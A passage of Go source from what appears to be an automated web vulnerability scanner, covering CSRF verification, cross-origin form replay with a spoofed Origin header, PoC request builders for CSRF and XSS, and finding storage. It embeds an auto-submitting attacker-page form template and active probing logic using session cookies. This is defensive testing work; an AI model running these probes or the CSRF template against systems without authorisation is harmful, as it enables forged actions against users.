		if lower == "cookie" || lower == "origin" || strings.Contains(lower, "csrf") {
			req.Header.Set(k, vv)
		}
	}
	resp, err := v.client.Do(req)
	if err != nil || resp == nil {
		return "", 0, ""
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 1024*1024))
	return string(body), resp.StatusCode, loginAuthSuccessSignal(resp, body)
}

// ── CSRF Verification ──

func (v *VerifierAgent) verifyCSRF(ctx context.Context, profile types.PageProfile, entry types.TrafficEntry, issue string) {
	v.tested++
	if csrfAuthBootstrapEndpoint(entry.Request.URL, entry.Request.Path) {
		v.dismissed++
		v.db.InsertNarration(v.scanID, "verifier", "dismissed",
			fmt.Sprintf("Skipped CSRF confirmation on auth/bootstrap endpoint %s; missing tokens on login/register/reset forms are not enough for a confirmed CSRF finding.",
				entry.Request.Path),
			entry.Request.URL, nil)
		return
	}
	if !csrfPassiveRequestLooksFormStateChange(profile, entry) {
		v.dismissed++
		v.db.InsertNarration(v.scanID, "verifier", "dismissed",
			fmt.Sprintf("Skipped passive CSRF confirmation on %s %s; JSON/API reads or non-form requests need active cross-origin replay and state-change proof before becoming CSRF findings.",
				entry.Request.Method, entry.Request.Path),
			entry.Request.URL, nil)
		return
	}

	// Check if there's a CSRF token in the form
	hasCSRFToken := false
	for _, inp := range profile.Inputs {
		nameLower := strings.ToLower(inp.Name)
		if strings.Contains(nameLower, "csrf") || strings.Contains(nameLower, "authenticity_token") || strings.Contains(nameLower, "_token") {
			hasCSRFToken = true
			break
		}
	}

	if hasCSRFToken {
		v.dismissed++
		return
	}

	// State-changing endpoint without CSRF token
	if entry.Request.Method == "POST" || entry.Request.Method == "PUT" || entry.Request.Method == "DELETE" {
		v.confirmed++
		v.db.InsertNarration(v.scanID, "verifier", "confirmed",
			fmt.Sprintf("%s %s changes state but has no CSRF token in the form — confirmed vulnerable.",
				entry.Request.Method, entry.Request.Path),
			entry.Request.URL, nil)

		// Reconstruct the original request as the PoC. An attacker can replay
		// this from any origin if the user is authenticated.
		pocReq := buildRawRequestFromEntry(entry)

		steps := fmt.Sprintf(
			"1. Authenticate as a target user so the session cookie is valid.\n"+
				"2. From an attacker-controlled page, auto-submit a POST form to %s with the same fields observed on the legitimate form:\n\n"+
				"```html\n<form action=\"%s\" method=\"%s\">\n  <!-- attacker-chosen field values -->\n  <input type=\"submit\">\n</form>\n<script>document.forms[0].submit();</script>\n```\n\n"+
				"3. The browser auto-submits with the victim's cookies. The server accepts the request because no CSRF token / SameSite / Origin check is enforced.",
			entry.Request.URL, entry.Request.URL, entry.Request.Method)

		impact := "Any action this endpoint performs — changing settings, transferring funds, posting content, deleting data — can be triggered by an attacker against an authenticated victim simply by getting them to visit a page or click a link. " +
			"Impact scales with what the endpoint does when called with valid session cookies."

		remediation := "Add a server-validated CSRF token to every state-changing request (synchronizer-token pattern). " +
			"Additionally (not as a replacement): set cookies to `SameSite=Lax` or `SameSite=Strict`, and reject requests whose Origin / Referer header does not match a known origin."

		v.storeFinding(profile, types.Finding{
			Title:            fmt.Sprintf("Missing CSRF protection on %s %s", entry.Request.Method, entry.Request.Path),
			Description:      fmt.Sprintf("The %s %s endpoint performs a state-changing action but the form posts no CSRF token, and the request is not protected by a server-side anti-CSRF check. Combined with default cookie scoping, this allows cross-site request forgery.", entry.Request.Method, entry.Request.Path),
			Severity:         types.SeverityMedium,
			Confidence:       types.ConfidenceConfirmed,
			VulnType:         "csrf",
			PocRequest:       pocReq,
			StepsToReproduce: steps,
			Impact:           impact,
			Remediation:      remediation,
			Evidence:         fmt.Sprintf("Method: %s\nPath: %s\nForm inputs inspected: no csrf/token/authenticity_token field present.", entry.Request.Method, entry.Request.Path),
		})
	} else {
		v.dismissed++
	}
}

func csrfPassiveRequestLooksFormStateChange(profile types.PageProfile, entry types.TrafficEntry) bool {
	method := strings.ToUpper(strings.TrimSpace(entry.Request.Method))
	switch method {
	case "POST", "PUT", "PATCH", "DELETE":
	default:
		return false
	}
	if len(profile.Inputs) == 0 {
		return false
	}
	if csrfGraphQLRequestLooksReadOnly(entry) {
		return false
	}
	contentType := strings.ToLower(headerValue(entry.Request.Headers, "Content-Type"))
	body := strings.TrimSpace(string(entry.Request.Body))
	if strings.HasPrefix(body, "{") || strings.HasPrefix(body, "[") ||
		strings.Contains(contentType, "application/json") ||
		strings.Contains(contentType, "application/graphql") {
		return false
	}
	return strings.Contains(contentType, "application/x-www-form-urlencoded") ||
		strings.Contains(contentType, "multipart/form-data") ||
		strings.Contains(contentType, "text/plain") ||
		contentType == ""
}

func csrfGraphQLRequestLooksReadOnly(entry types.TrafficEntry) bool {
	if !strings.Contains(strings.ToLower(entry.Request.URL), "graphql") &&
		!strings.Contains(strings.ToLower(entry.Request.Path), "graphql") {
		return false
	}
	body := strings.ToLower(strings.TrimSpace(string(entry.Request.Body)))
	if body == "" {
		if parsed, err := url.Parse(entry.Request.URL); err == nil {
			body = strings.ToLower(parsed.Query().Get("query"))
		}
	}
	if body == "" {
		return false
	}
	if strings.Contains(body, "mutation") || strings.Contains(body, "subscription") {
		return false
	}
	return strings.Contains(body, "query") || strings.Contains(body, "{")
}

func csrfAuthBootstrapEndpoint(rawURL, path string) bool {
	text := strings.ToLower(strings.TrimSpace(path))
	if text == "" {
		if parsed, err := url.Parse(rawURL); err == nil {
			text = strings.ToLower(parsed.Path)
		}
	}
	for _, marker := range []string{
		"login", "signin", "sign-in",
		"register", "registration", "signup", "sign-up",
		"logout",
		"forgot", "reset-password", "password-reset", "reset",
		"2fa", "mfa", "otp",
	} {
		if strings.Contains(text, marker) {
			return true
		}
	}
	return false
}

// probeCSRFStateChangingForms is the proactive counterpart to verifyCSRF.
// The LLM/strategist path only runs when a page profile explicitly calls out
// "CSRF"; in practice, modern apps often hide account forms behind client-side
// auth and no hypothesis is emitted. This pass models a human pentester's first
// CSRF check: once we have a legitimate same-origin session, open low-risk
// account/profile/settings pages, inspect their HTML forms, and submit a
// harmless marker from a hostile Origin. A finding is confirmed only when the
// marker persists back into the authenticated page.
func (v *VerifierAgent) probeCSRFStateChangingForms(ctx context.Context, target string) {
	authHeaders, authSource := v.credentialHeadersForURL(target + "/")
	if len(authHeaders) == 0 {
		return
	}
	authAttempts := projectionAuthAttempts(authHeaders, authSource)
	if len(authAttempts) == 0 {
		return
	}
	pages := v.csrfAuthenticatedFormPageCandidates(target, 16)
	if len(pages) == 0 {
		return
	}

	confirmed := 0
	for _, pageURL := range pages {
		if ctx.Err() != nil || confirmed >= 2 {
			return
		}
		for _, attempt := range authAttempts {
			if ctx.Err() != nil || confirmed >= 2 {
				return
			}
			resp, body, _, err := v.proactiveGETWithHeaders(ctx, pageURL, attempt.Headers, "AOBTD/Verifier (csrf form discovery)")
			if err != nil || resp == nil || resp.StatusCode < 200 || resp.StatusCode >= 300 {
				continue
			}
			if !strings.Contains(strings.ToLower(resp.Header.Get("Content-Type")), "html") &&
				!strings.Contains(strings.ToLower(body), "<form") {
				continue
			}
			extracted := extract.ExtractHTML([]byte(body), pageURL)
			for _, form := range extracted.Forms {
				if ctx.Err() != nil || confirmed >= 2 {
					return
				}
				actionURL := strings.TrimSpace(form.Action)
				if actionURL == "" {
					actionURL = pageURL
				}
				if !csrfFormLooksSafe(pageURL, actionURL, form) || csrfFormHasToken(form) {
					continue
				}
				marker := fmt.Sprintf("aobtd_csrf_%d_%d", v.scanID, time.Now().UnixNano()%1000000)
				values, field, ok := csrfFormProbeValues(form, marker)
				if !ok {
					continue
				}
				v.tested++
				postResp, postBody, usedHeaders, err := v.sendCSRFFormReplay(ctx, actionURL, form.Method, values, attempt.Headers)
				if err != nil || postResp == nil {
					v.dismissed++
					continue
				}
				if postResp.StatusCode < 200 || postResp.StatusCode >= 400 {
					v.dismissed++
					continue
				}
				confirmURLs := []string{pageURL}
				if loc := responseLocationURL(actionURL, postResp); loc != "" {
					confirmURLs = append(confirmURLs, loc)
				}
				confirmURLs = append(confirmURLs, actionURL)
				if !v.confirmCSRFMarker(ctx, confirmURLs, headersWithResponseSetCookies(usedHeaders, postResp), marker) {
					if strings.Contains(postBody, marker) {
						// Reflection alone is weaker than persistence. Keep the
						// signal out of confirmed findings to avoid noisy CSRF
						// reports on forms that simply echo validation errors.
						v.db.LogAI(v.scanID, "verifier", "csrf_reflection_only",
							"Cross-origin form POST reflected the marker but did not persist it",
							pageURL, actionURL, field)
					}
					v.dismissed++
					continue
				}
				v.confirmed++
				confirmed++
				v.storeCSRFStateChangingFormFinding(pageURL, actionURL, form.Method, field, marker, values, postResp.StatusCode, attempt.Source)
				v.db.InsertNarration(v.scanID, "verifier", "confirmed",
					fmt.Sprintf("%s accepted a cross-origin form POST to %s without a CSRF token and persisted %q.",
						strings.ToUpper(form.Method), csrfEndpointPath(actionURL), field),
					actionURL, map[string]any{"field": field, "page": pageURL})
			}
		}
	}
}

func (v *VerifierAgent) csrfAuthenticatedFormPageCandidates(target string, limit int) []string {
	if limit <= 0 {
		limit = 16
	}
	base := strings.TrimRight(target, "/")
	if base == "" {
		return nil
	}
	seen := make(map[string]struct{})
	var out []string
	add := func(raw string) {
		raw = strings.TrimSpace(raw)
		if raw == "" || originFromURL(raw) != originFromURL(base) {
			return
		}
		if !csrfProfileLikeURL(raw) {
			return
		}
		if _, ok := seen[raw]; ok {
			return
		}
		seen[raw] = struct{}{}
		out = append(out, raw)
	}

	rows, err := v.db.Conn().Query(`
		SELECT DISTINCT target_url
		FROM url_discoveries
		WHERE scan_id = ?
		  AND kind IN (?, ?, ?, ?)
		ORDER BY id ASC
		LIMIT 200`,
		v.scanID, store.DiscoveryHTMLLink, store.DiscoveryFormAction,
		store.DiscoveryJSRoute, store.DiscoveryNavigator)
	if err == nil {
		defer rows.Close()
		for rows.Next() {
			var raw string
			if err := rows.Scan(&raw); err == nil {
				add(raw)
				if len(out) >= limit {
					return out
				}
			}
		}
	}

	for _, path := range []string{
		"/profile",
		"/account",
		"/account/profile",
		"/account/settings",
		"/settings",
		"/settings/profile",
		"/user/profile",
		"/users/profile",
		"/me",
		"/my-account",
		"/my/profile",
		"/preferences",
		"/profile/edit",
		"/account/edit",
	} {
		add(base + path)
		if len(out) >= limit {
			break
		}
	}
	return out
}

func csrfProfileLikeURL(raw string) bool {
	parsed, err := url.Parse(raw)
	if err != nil {
		return false
	}
	text := strings.ToLower(parsed.Path + "/" + parsed.Fragment)
	for _, marker := range []string{
		"profile", "account", "settings", "preference", "user", "users", "me",
	} {
		if strings.Contains(text, marker) {
			return true
		}
	}
	return false
}

func csrfFormLooksSafe(pageURL, actionURL string, form extract.ExtractedForm) bool {
	method := strings.ToUpper(strings.TrimSpace(form.Method))
	if method == "" {
		method = "GET"
	}
	if method != "POST" {
		return false
	}
	if originFromURL(pageURL) == "" || originFromURL(actionURL) != originFromURL(pageURL) {
		return false
	}
	lowerAction := strings.ToLower(actionURL)
	lowerEnctype := strings.ToLower(form.Enctype)
	if strings.Contains(lowerEnctype, "multipart") {
		return false
	}
	for _, blocked := range []string{
		"login", "signin", "sign-in", "logout", "delete", "remove", "password",
		"reset", "2fa", "mfa", "payment", "checkout", "order", "transfer",
		"image/file", "upload",
	} {
		if strings.Contains(lowerAction, blocked) {
			return false
		}
	}
	return csrfProfileLikeURL(pageURL) || csrfProfileLikeURL(actionURL)
}

func csrfFormHasToken(form extract.ExtractedForm) bool {
	for _, input := range form.Inputs {
		text := strings.ToLower(strings.TrimSpace(input.Name + " " + input.Label + " " + input.Type))
		if strings.Contains(text, "csrf") ||
			strings.Contains(text, "xsrf") ||
			strings.Contains(text, "authenticity_token") ||
			strings.Contains(text, "anti-forgery") ||
			strings.Contains(text, "antiforgery") ||
			strings.Contains(text, "_token") {
			return true
		}
	}
	return false
}

func csrfFormProbeValues(form extract.ExtractedForm, marker string) (url.Values, string, bool) {
	field := ""
	bestScore := 0
	for _, input := range form.Inputs {
		score := csrfProbeFieldScore(input)
		if score > bestScore {
			bestScore = score
			field = strings.TrimSpace(input.Name)
		}
	}
	if field == "" {
		return nil, "", false
	}
	values := url.Values{}
	for _, input := range form.Inputs {
		name := strings.TrimSpace(input.Name)
		if name == "" {
			continue
		}
		inputType := strings.ToLower(strings.TrimSpace(input.Type))
		switch inputType {
		case "submit", "button", "reset", "file", "image":
			continue
		}
		if name == field {
			values.Set(name, marker)
			continue
		}
		if input.Value != "" {
			values.Set(name, input.Value)
			continue
		}
		if input.Required {
			values.Set(name, csrfDefaultInputValue(input))
		}
	}
	if values.Get(field) != marker {
		return nil, "", false
	}
	return values, field, true
}

func csrfProbeFieldScore(input extract.ExtractedInput) int {
	name := strings.ToLower(strings.TrimSpace(input.Name))
	if name == "" {
		return 0
	}
	inputType := strings.ToLower(strings.TrimSpace(input.Type))
	switch inputType {
	case "hidden", "password", "email", "submit", "button", "reset", "file", "image", "checkbox", "radio":
		return 0
	}
	text := name + " " + strings.ToLower(input.Label+" "+input.Placeholder)
	score := 0
	for _, exact := range []string{"username", "displayname", "display_name", "nickname", "handle"} {
		if name == exact {
			score += 100
		}
	}
	for _, marker := range []string{"username", "display", "nick", "handle", "profile", "name", "bio", "about", "description"} {
		if strings.Contains(text, marker) {
			score += 20
		}
	}
	if input.Value != "" {
		score += 5
	}
	return score
}

func csrfDefaultInputValue(input extract.ExtractedInput) string {
	switch strings.ToLower(strings.TrimSpace(input.Type)) {
	case "email":
		return "aobtd@example.test"
	case "url":
		return "https://example.test/aobtd"
	case "number", "range":
		return "1"
	default:
		return "aobtd"
	}
}

func (v *VerifierAgent) sendCSRFFormReplay(ctx context.Context, actionURL, method string, values url.Values, headers map[string]string) (*http.Response, string, map[string]string, error) {
	method = strings.ToUpper(strings.TrimSpace(method))
	if method == "" {
		method = "POST"
	}
	req, err := http.NewRequestWithContext(ctx, method, actionURL, strings.NewReader(values.Encode()))
	if err != nil {
		return nil, "", nil, err
	}
	req.Header.Set("User-Agent", "AOBTD/Verifier (csrf cross-origin form replay)")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Origin", "http://htmledit.squarefree.com")
	req.Header.Set("Referer", "http://htmledit.squarefree.com/")
	for k, val := range headers {
		lower := strings.ToLower(strings.TrimSpace(k))
		if lower == "" || lower == "host" || lower == "content-length" ||
			lower == "origin" || lower == "referer" || lower == "content-type" {
			continue
		}
		req.Header.Set(k, val)
	}

	noRedirectClient := *v.client
	noRedirectClient.CheckRedirect = func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	}
	resp, err := noRedirectClient.Do(req)
	if err != nil || resp == nil {
		return nil, "", nil, err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 256*1024))
	used := make(map[string]string, len(req.Header))
	for k, vs := range req.Header {
		if len(vs) > 0 {
			used[k] = vs[0]
		}
	}
	return resp, string(body), used, nil
}

func (v *VerifierAgent) confirmCSRFMarker(ctx context.Context, urls []string, headers map[string]string, marker string) bool {
	seen := make(map[string]struct{})
	for _, raw := range urls {
		if ctx.Err() != nil {
			return false
		}
		raw = strings.TrimSpace(raw)
		if raw == "" {
			continue
		}
		if _, ok := seen[raw]; ok {
			continue
		}
		seen[raw] = struct{}{}
		resp, body, _, err := v.proactiveGETWithHeaders(ctx, raw, headers, "AOBTD/Verifier (csrf persistence confirmation)")
		if err != nil || resp == nil || resp.StatusCode < 200 || resp.StatusCode >= 300 {
			continue
		}
		if strings.Contains(body, marker) {
			return true
		}
	}
	return false
}

func headersWithResponseSetCookies(headers map[string]string, resp *http.Response) map[string]string {
	out := cloneHeaderMap(headers)
	if out == nil {
		out = make(map[string]string)
	}
	if resp == nil {
		return out
	}
	for _, raw := range resp.Header.Values("Set-Cookie") {
		name, value, ok := parseSetCookieNameValue(raw)
		if !ok {
			continue
		}
		out["Cookie"] = setCookieValue(out["Cookie"], name, value)
	}
	return out
}

func parseSetCookieNameValue(raw string) (string, string, bool) {
	pair := strings.TrimSpace(strings.SplitN(raw, ";", 2)[0])
	if pair == "" || !strings.Contains(pair, "=") {
		return "", "", false
	}
	parts := strings.SplitN(pair, "=", 2)
	name := strings.TrimSpace(parts[0])
	value := strings.TrimSpace(parts[1])
	if name == "" {
		return "", "", false
	}
	return name, value, true
}

func setCookieValue(existing, name, value string) string {
	name = strings.TrimSpace(name)
	value = strings.TrimSpace(value)
	if name == "" {
		return existing
	}
	var parts []string
	replaced := false
	for _, part := range strings.Split(existing, ";") {
		part = strings.TrimSpace(part)
		if part == "" {
			continue
		}
		key := strings.TrimSpace(strings.SplitN(part, "=", 2)[0])
		if strings.EqualFold(key, name) {
			parts = append(parts, name+"="+value)
			replaced = true
		} else {
			parts = append(parts, part)
		}
	}
	if !replaced {
		parts = append(parts, name+"="+value)
	}
	return strings.Join(parts, "; ")
}

func responseLocationURL(baseURL string, resp *http.Response) string {
	if resp == nil {
		return ""
	}
	loc := strings.TrimSpace(resp.Header.Get("Location"))
	if loc == "" {
		return ""
	}
	parsed, err := url.Parse(loc)
	if err != nil {
		return ""
	}
	if parsed.IsAbs() {
		return parsed.String()
	}
	base, err := url.Parse(baseURL)
	if err != nil {
		return ""
	}
	return base.ResolveReference(parsed).String()
}

func csrfEndpointPath(rawURL string) string {
	parsed, err := url.Parse(rawURL)
	if err != nil {
		return rawURL
	}
	path := parsed.Path
	if path == "" {
		path = "/"
	}
	if parsed.RawQuery != "" {
		path += "?" + parsed.RawQuery
	}
	return path
}

func (v *VerifierAgent) storeCSRFStateChangingFormFinding(pageURL, actionURL, method, field, marker string, values url.Values, status int, authSource string) {
	path := csrfEndpointPath(actionURL)
	method = strings.ToUpper(strings.TrimSpace(method))
	if method == "" {
		method = "POST"
	}
	redactedBody := values.Encode()
	pocReq := fmt.Sprintf("%s %s HTTP/1.1\nHost: <target>\nCookie: <victim-session-cookie>\nOrigin: http://htmledit.squarefree.com\nReferer: http://htmledit.squarefree.com/\nContent-Type: application/x-www-form-urlencoded\n\n%s",
		method, path, redactedBody)
	profile := types.PageProfile{ID: method + " " + path, URL: actionURL, Method: method}
	v.storeFinding(profile, types.Finding{
		Title: fmt.Sprintf("Missing CSRF protection on %s %s", method, path),
		Description: fmt.Sprintf(
			"The authenticated form at %s submits to %s without an anti-CSRF token. A cross-origin form replay from Origin http://htmledit.squarefree.com was accepted and persisted a harmless marker in field %q.",
			pageURL, actionURL, field),
		Severity:    types.SeverityMedium,
		Confidence:  types.ConfidenceConfirmed,
		EndpointID:  method + " " + path,
		VulnType:    "csrf",
		ParamName:   field,
		Payload:     marker,
		PocRequest:  pocReq,
		PocResponse: fmt.Sprintf("HTTP status after cross-origin form replay: %d", status),
		StepsToReproduce: fmt.Sprintf(
			"1. Authenticate as a victim and visit %s.\n"+
				"2. From an attacker-controlled page, auto-submit a form to %s with `%s=%s`.\n"+
				"3. The browser sends the victim's cookies. The server accepts the request without a CSRF token and the marker persists on the authenticated profile/settings page.",
			pageURL, actionURL, field, marker),
		Impact: "Any state change exposed through this form can be triggered cross-site against an authenticated victim. " +
			"For account/profile forms this can alter user-visible identity or chained security settings; for higher-impact forms the same missing protection can become account takeover or transaction abuse.",
		Remediation: "Add a server-validated anti-CSRF token to state-changing forms and reject unsafe-method requests whose Origin/Referer does not match the application origin. Also set session cookies to SameSite=Lax or Strict where compatible.",
		Evidence: fmt.Sprintf(
			"Page URL: %s\nAction URL: %s\nMethod: %s\nField changed: %s\nAuth source: %s\nNo csrf/xsrf/authenticity token field was present.\nCross-origin replay status: %d\nPersistence marker observed after replay: %s",
			pageURL, actionURL, method, field, authSource, status, marker),
	})
}

// ── HTTP helpers ──

func (v *VerifierAgent) sendGETWithParam(ctx context.Context, rawURL, param, value string, origHeaders map[string]string) (*http.Response, string, error) {
	parsed, err := url.Parse(rawURL)
	if err != nil {
		return nil, "", err
	}
	q := parsed.Query()
	q.Set(param, value)
	parsed.RawQuery = q.Encode()

	req, err := http.NewRequestWithContext(ctx, "GET", parsed.String(), nil)
	if err != nil {
		return nil, "", err
	}
	for k, val := range origHeaders {
		lower := strings.ToLower(k)
		if lower == "host" || lower == "content-length" {
			continue
		}
		req.Header.Set(k, val)
	}

	// Don't follow redirects for redirect testing
	noRedirectClient := *v.client
	noRedirectClient.CheckRedirect = func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	}

	resp, err := noRedirectClient.Do(req)
	if err != nil {
		return nil, "", err
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(io.LimitReader(resp.Body, 256*1024))
	return resp, string(body), nil
}

func (v *VerifierAgent) sendPOSTWithParam(ctx context.Context, rawURL, param, value string, origHeaders map[string]string, origBody []byte) (*http.Response, string, error) {
	// Try to inject into the original body
	bodyStr := string(origBody)
	var newBody string

	contentType := ""
	for k, val := range origHeaders {
		if strings.ToLower(k) == "content-type" {
			contentType = val
		}
	}

	if strings.Contains(contentType, "json") {
		// JSON body — try to inject
		var parsed map[string]any
		if json.Unmarshal(origBody, &parsed) == nil {
			parsed[param] = value
			b, _ := json.Marshal(parsed)
			newBody = string(b)
		} else {
			newBody = bodyStr
		}
	} else {
		// Form-encoded — append or replace param
		if strings.Contains(bodyStr, param+"=") {
			// Replace existing value
			parts := strings.Split(bodyStr, "&")
			for i, p := range parts {
				if strings.HasPrefix(p, param+"=") {
					parts[i] = param + "=" + url.QueryEscape(value)
				}
			}
			newBody = strings.Join(parts, "&")
		} else {
			if bodyStr != "" {
				newBody = bodyStr + "&" + param + "=" + url.QueryEscape(value)
			} else {
				newBody = param + "=" + url.QueryEscape(value)
			}
		}
	}

	req, err := http.NewRequestWithContext(ctx, "POST", rawURL, strings.NewReader(newBody))
	if err != nil {
		return nil, "", err
	}
	for k, val := range origHeaders {
		lower := strings.ToLower(k)
		if lower == "host" || lower == "content-length" {
			continue
		}
		req.Header.Set(k, val)
	}

	resp, err := v.client.Do(req)
	if err != nil {
		return nil, "", err
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(io.LimitReader(resp.Body, 256*1024))
	return resp, string(body), nil
}

// ── Helpers ──

// storeFinding saves a types.Finding, automatically setting the endpoint id
// from the profile and skipping duplicates by (title, endpoint_id).
func (v *VerifierAgent) storeFinding(profile types.PageProfile, f types.Finding) {
	if f.EndpointID == "" {
		f.EndpointID = profile.ID
	}
	if v.db.FindingExists(v.scanID, f.Title, f.EndpointID) {
		return
	}
	// If the Strategist emitted a directive for this endpoint tied to a
	// hypothesis, link this Verifier-produced finding back so InsertFinding
	// auto-confirms that hypothesis. Skip if the caller already set one
	// (e.g. Explorer-produced findings already carry task.HypothesisID).
	if f.HypothesisID == "" {
		f.HypothesisID = v.lookupHypothesisForEndpoint(profile.ID)
	}
	v.db.InsertFinding(v.scanID, f)
}

// lookupHypothesisForEndpoint finds a Strategist hypothesis that's being
// tested via directives for this endpoint. Used so Verifier-confirmed
// findings (XSS, CSRF, etc.) can close the feedback loop even when the
// Strategist didn't go through Explorer's probe machinery. Returns the
// first matching hypothesis id, or "" if none.
func (v *VerifierAgent) lookupHypothesisForEndpoint(endpointID string) string {
	if endpointID == "" {
		return ""
	}
	// Prefer active-state hypotheses (not yet resolved) — no point attaching
	// to one that's already confirmed or refuted.
	var hypID string
	err := v.db.Conn().QueryRow(`
		SELECT fu.hypothesis_id
		FROM follow_ups fu
		LEFT JOIN hypotheses h
		  ON h.scan_id = fu.scan_id AND h.id = fu.hypothesis_id
		WHERE fu.scan_id = ?
		  AND fu.source_profile_id = ?
		  AND fu.hypothesis_id != ''
		  AND (h.status IS NULL OR h.status = 'active')
		ORDER BY fu.id DESC
		LIMIT 1`, v.scanID, endpointID).Scan(&hypID)
	if err != nil {
		return ""
	}
	return hypID
}

// buildRawRequestFromEntry reconstructs the original request as a Burp-style
// raw HTTP string — used as the PoC for CSRF (which just replays the observed
// request cross-origin).
func buildRawRequestFromEntry(entry types.TrafficEntry) string {
	parsed, err := url.Parse(entry.Request.URL)
	var host, path string
	if err == nil {
		host = parsed.Host
		path = parsed.Path
		if parsed.RawQuery != "" {
			path += "?" + parsed.RawQuery
		}
	} else {
		host = entry.Request.Host
		path = entry.Request.Path
	}
	if path == "" {
		path = "/"
	}
	var b strings.Builder
	fmt.Fprintf(&b, "%s %s HTTP/1.1\nHost: %s\n", entry.Request.Method, path, host)
	for k, v := range entry.Request.Headers {
		lower := strings.ToLower(k)
		if lower == "host" || lower == "content-length" {
			continue
		}
		fmt.Fprintf(&b, "%s: %s\n", k, v)
	}
	if len(entry.Request.Body) > 0 {
		fmt.Fprintf(&b, "Content-Length: %d\n\n%s", len(entry.Request.Body), string(entry.Request.Body))
	} else {
		b.WriteString("\n")
	}
	return b.String()
}

// buildXSSRequest constructs a Burp-style raw HTTP request with the XSS
// payload injected into the given parameter.
func buildXSSRequest(method, rawURL, param, payload string, origHeaders map[string]string, origBody []byte) string {
	parsed, err := url.Parse(rawURL)
	if err != nil {
		return fmt.Sprintf("%s %s HTTP/1.1\n[param=%s payload=%s]", method, rawURL, param, payload)
	}
	reqLine := ""
	var bodyStr string

	if method == "GET" || method == "" {
		q := parsed.Query()
		q.Set(param, payload)
		parsed.RawQuery = q.Encode()
		path := parsed.Path
		if path == "" {
			path = "/"
		}
		if parsed.RawQuery != "" {
			path += "?" + parsed.RawQuery
		}
		reqLine = fmt.Sprintf("GET %s HTTP/1.1", path)
	} else {
		// POST: inject into body (preserving original format if possible)
		path := parsed.Path
		if path == "" {
			path = "/"
		}
		reqLine = fmt.Sprintf("%s %s HTTP/1.1", method, path)
		bodyStr = injectParamIntoBody(string(origBody), param, payload, origHeaders)
	}

	var b strings.Builder
	b.WriteString(reqLine)
	b.WriteString("\n")
	b.WriteString("Host: ")
	b.WriteString(parsed.Host)
	b.WriteString("\n")
	for k, val := range origHeaders {
		lower := strings.ToLower(k)
		if lower == "host" || lower == "content-length" {
			continue
		}
		fmt.Fprintf(&b, "%s: %s\n", k, val)
	}
	if bodyStr != "" {
		fmt.Fprintf(&b, "Content-Length: %d\n", len(bodyStr))
		b.WriteString("\n")
		b.WriteString(bodyStr)
	} else {
		b.WriteString("\n")
	}
	return b.String()
}

// injectParamIntoBody mutates a request body to set `param=payload`. Handles
// JSON bodies and form-encoded bodies.
func injectParamIntoBody(body, param, payload string, headers map[string]string) string {
	contentType := ""
	for k, v := range headers {
		if strings.ToLower(k) == "content-type" {
			contentType = v
		}
	}
	if strings.Contains(contentType, "json") {
		// naive: add/replace key at top level
		return fmt.Sprintf(`{"%s":"%s"}`, param, strings.ReplaceAll(payload, `"`, `\"`))
	}
	// form-encoded
	if strings.Contains(body, param+"=") {
		parts := strings.Split(body, "&")
		for i, p := range parts {
			if strings.HasPrefix(p, param+"=") {
				parts[i] = param + "=" + url.QueryEscape(payload)
			}
		}
		return strings.Join(parts, "&")
	}
	if body != "" {
		return body + "&" + param + "=" + url.QueryEscape(payload)
	}
	return param + "=" + url.QueryEscape(payload)
}

// buildPocResponse formats a response with status line, headers, and a
// truncated body snippet highlighting the match.
func buildPocResponse(resp *http.Response, body, match string) string {
	var b strings.Builder
	fmt.Fprintf(&b, "HTTP/%d.%d %d %s\n", resp.ProtoMajor, resp.ProtoMinor, resp.StatusCode, http.StatusText(resp.StatusCode))
	for k, vs := range resp.Header {
		for _, v := range vs {
			fmt.Fprintf(&b, "%s: %s\n", k, v)
		}
	}
	b.WriteString("\n")

	// Highlight the match by showing a window of ±200 chars around it.
	if idx := strings.Index(body, match); idx >= 0 {
		start := idx - 200
		if start < 0 {
			start = 0
		}
		end := idx + len(match) + 200
		if end > len(body) {
			end = len(body)
		}
		if start > 0 {
			b.WriteString("...\n")
		}
		b.WriteString(body[start:end])
		if end < len(body) {
			b.WriteString("\n...")
		}
	} else {
		// no match in body; show first 800 chars
		if len(body) > 800 {
			b.WriteString(body[:800])
			b.WriteString("\n...")
		} else {
			b.WriteString(body)
		}
	}
	return b.String()
}

func (v *VerifierAgent) findTrafficForProfile(profile types.PageProfile) []types.TrafficEntry {
	// Try to find traffic matching this profile's URL
	// Extract path from profile URL
	profileURL := profile.URL
	if profileURL == "" {
		return nil
	}

	parsed, err := url.Parse(profileURL)
	if err != nil {
		return nil
	}

	// Search traffic by path
	rows, err := v.db.Conn().Query(`
		SELECT id, method, url, host, path, query, request_headers, request_body,
		       status_code, response_headers, response_body, content_type, endpoint_hash
		FROM traffic_resolved
		WHERE scan_id = ? AND is_filtered = FALSE AND path = ?
		LIMIT 3`, v.scanID, parsed.Path)
	if err != nil {
		return nil
	}
	defer rows.Close()

	var entries []types.TrafficEntry
	for rows.Next() {
		var id int64
		var method, rawURL, host, path, query string
		var reqHeaders, reqBody []byte
		var statusCode int
		var resHeaders, resBody []byte
		var contentType, endpointHash string

		rows.Scan(&id, &method, &rawURL, &host, &path, &query, &reqHeaders, &reqBody,
			&statusCode, &resHeaders, &resBody, &contentType, &endpointHash)

		var rh, resh map[string]string
		json.Unmarshal(reqHeaders, &rh)
		json.Unmarshal(resHeaders, &resh)
		if rh == nil {
			rh = map[string]string{}
		}
		if resh == nil {
			resh = map[string]string{}
		}

		entries = append(entries, types.TrafficEntry{
			ID:           id,
			EndpointHash: endpointHash,
			Request: types.CapturedRequest{
				Method:  method,
				URL:     rawURL,
				Host:    host,
				Path:    path,
				Query:   query,
				Headers: rh,
				Body:    reqBody,
			},
			Response: types.CapturedResponse{
				StatusCode: statusCode,
				Headers:    resh,
				Body:       resBody,
			},
		})
	}

	return entries
}

// extractParamFromIssue tries to pull a parameter name from an issue description.
// e.g., "The 'return_to' parameter is reflected..." -> "return_to"
func extractParamFromIssue(issue string) string {
	// Look for 'param_name' pattern
	for i := 0; i < len(issue); i++ {
		if issue[i] == '\'' {
			end := strings.Index(issue[i+1:], "'")
			if end > 0 && end < 40 {
				candidate := issue[i+1 : i+1+end]
